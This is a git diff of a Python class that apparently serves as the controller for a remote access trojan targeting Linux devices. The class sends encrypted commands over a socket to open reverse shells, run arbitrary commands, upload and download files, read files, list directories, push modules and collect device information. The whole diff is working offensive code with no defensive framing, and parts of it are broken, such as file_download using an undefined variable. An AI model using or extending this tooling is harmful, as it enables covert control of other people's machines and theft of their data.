@@ -8,6 +8,8 @@ class Linux():
         """Save Infos to the Device Database"""
         conn = connect("Data/db.sqlite3")
         curr = conn.cursor()
+        infos = self.infos()
+
     def __str__(self) -> str:
         return str(self.addr[0])
 
@@ -33,6 +35,14 @@ class Linux():
         # Send a Request to execute a Module
         # Check if Modules is loaded
         # Get Output from the Module
+        try:
+            with open(f"Modules/{module}.py", "r") as f:
+                pass
+        except FileNotFoundError:
+            return "Module not found"
+        self.conn.send(self.encrypt(f"module:"))
+        time.sleep(1)
+        self.conn.send(self.encrypt(module))
         pass
 
     def revshell(self, address, port):
@@ -42,10 +52,9 @@ class Linux():
             port (int): Receiver Port
 
         Returns:
-            bool: True if success, False if not
-            str: Message
+            str: Output or Error Message
         """
-        self.conn.send(self.encrypt(f"SHELL:{address}:{port}"))
+        self.conn.send(self.encrypt(f"shell:{address}:{port}"))
         output = self.decrypt(self.conn.recv(1024))
         if output.startswith("!"):
             raise Exception("Couldn't open a Reverse Shell")
@@ -57,10 +66,8 @@ class Linux():
         Args:
             fil (string): File to Upload
             path (string): Path to Upload the File to
-
         Returns:
-            bool: True if success, False if not
-            str: Error or Success Message
+            str: Output or Error Message
         """
         f = open(fil, "rb")
         fil = fil.split("/")
@@ -72,6 +79,7 @@ class Linux():
             raise Exception("File Upload Failed")
         else:
             return output
+
     def file_download(self, device_path, own_path):
         """Upload a File to a Device
         Args:
@@ -80,8 +88,7 @@ class Linux():
             own_path (string): Path to Download the File to
 
         Returns:
-            bool: True if success, False if not
-            str: Error or Success Message
+            str: Output or Error Message
         """
         f = open(fil, "rb")
         fil = fil.split("/")
@@ -100,23 +107,20 @@ class Linux():
             cmd (str): Command to execute
 
         Returns:
-            bool: True if success, False if not
-            str: Output of the command
+            str: Output of the command or Error Message
         """
-        self.conn.send(self.encrypt(f"CMD:{cmd}"))
+        self.conn.send(self.encrypt(f"cmd:{cmd}"))
         output = self.decrypt(self.conn.recv(1024))
+        return output
 
-    def get_device_infos(self):
+    def infos(self):
         """Get Infos about a Device
         Args:
         Returns:
-            bool: True if success, False if not
             str: Infos about the Device
         """
-        self.conn.send(self.encrypt(f"INFOS:"))
+        self.conn.send(self.encrypt(f"infos:"))
         output = self.decrypt(self.conn.recv(1024))
-        print(output)
-        output = json.loads(output)
         return output
 
     def get_directory_contents(self, dir):
@@ -124,8 +128,7 @@ class Linux():
         Args:
             dir (str): Directory to get the contents of
         Returns:
-            bool: True if success, False if not
-            str: Files in the directory or an Error Message
+            output (str): Output or Error Message
         """
         self.conn.send(self.encrypt(f"dir:{dir}"))
         output = self.decrypt(self.conn.recv(1024))
@@ -135,13 +138,22 @@ class Linux():
             return output
 
     def get_file_contents(self, path):
+        """Get the contents of a File
+        Args:
+            path (str): Path to the File
+        Returns:
+            output (str): Output or Error Message
+        """
         self.conn.send(self.encrypt(f"content:{path}"))
         output = self.decrypt(self.conn.recv(1024))
         if output.startswith("!"):
             raise Exception("Couldn't get the File")
         else:
             return output
+
     def alive(self):
-        self.conn.send(self.encrypt("alive:alive"))
-        if self.conn.recv(1024).decode() == "alive":
-            raise Exception("Device is not alive")
+        try:
+            self.conn.send(self.encrypt("alive:"))
+        except socket.error:
+            return False
+        return True
